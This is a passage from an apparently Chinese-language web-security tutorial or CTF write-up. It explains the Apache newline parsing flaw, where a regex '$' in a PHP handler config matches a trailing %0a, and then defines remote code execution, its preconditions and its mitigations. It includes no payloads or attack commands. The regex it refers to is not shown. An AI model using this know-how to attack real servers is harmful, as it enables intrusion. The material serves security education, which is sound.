5.漏洞原理

此题的网站用的apache2，同时用了mod_php模块对php文件进行处理。在其配置文件/etc/apache2/conf-enable/docker-php.conf中存在如下正则表达式

这里有一个$，它是用来匹配字符串结尾位置的，而且如果设置了RegExp对象(正则表达式)的 Multiline(/m) 属性，则$也匹配\n或\r
所以如果我们设置了RegExp对象的Multiline属性(\m)的条件下，$还会匹配到字符串结尾的换行符(也就是%0a),于是也就产生了这么一个换行解析漏洞

六、RCE漏洞

RCE，Remote Code Execute，远程代码执行。黑客能够在受害者的主机上执行恶意代码，导致数据泄露甚至被获取最高权限

利用条件

  • 不安全的输入处理:例如，web应用未正确处理用户输入，使得攻击者能够注入恶意代码
  • 依赖库或第三方组件漏洞:使用存在漏洞的第三方库或组件，攻击者可以通过已知的漏洞触发 RCE
  • 不当的权限配置:系统或应用程序未正确配置权限，使得攻击者能够执行高级命令

解决方案

  • 输入验证和过滤:严格验证和过滤用户输入，防止恶意代码注入。
  • 最小权限原则:应用程序和系统仅授予必要的权限，防止代码执行超出预期范围。
  • 使用安全编码实践:遵循安全的编码规范，避免常见的编程错误(如缓冲区溢出、SQL 注入)
  • 及时更新和打补丁:保持系统和软件的最新状态，及时修复已知的安全漏洞
